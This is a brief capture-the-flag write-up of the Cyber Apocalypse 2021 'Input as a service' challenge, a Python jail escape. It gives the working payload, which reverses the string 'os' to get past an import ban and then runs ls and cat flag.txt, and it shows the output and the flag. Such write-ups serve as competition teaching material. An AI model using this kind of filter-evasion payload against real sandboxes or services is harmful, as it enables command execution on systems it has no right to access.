---
layout: load_md
title: The White Circle | Cyber Apocalypse 2021 | Input as a service Writeup
desc: Check out our writeup for Input as a service for Cyber Apocalypse 2021 capture the flag competition.
image: images/twc_og_banner.jpg
ctf: Cyber Apocalypse 2021
parent: cyber_apocalypse_2021
category: misc
challenge: Input as a service
tags: "misc, ava, python, jail, escape"
date: 2021-04-24T00:00:00+00:00
last_modified_at: 2021-04-24T00:00:00+00:00
---



> Solved by : ava

* We are given a py-jail 
* https://programmer.help/blogs/python-sandbox-escape.html 
* I used this website as reference, `os` and such imports are banned, so we used string manipulation
* we just reverse the string `os` to `so` and import it and then do `ls` command to * * see the `flag.txt` and then just `cat` the flag
* the code to do is given below

```bash

__import__('so'[::-1]).system('ls')


flag.txt
input_as_a_service.py


__import__('so'[::-1]).system('cat flag.txt')

CHTB{4li3n5_us3_pyth0n2.X?!}
```

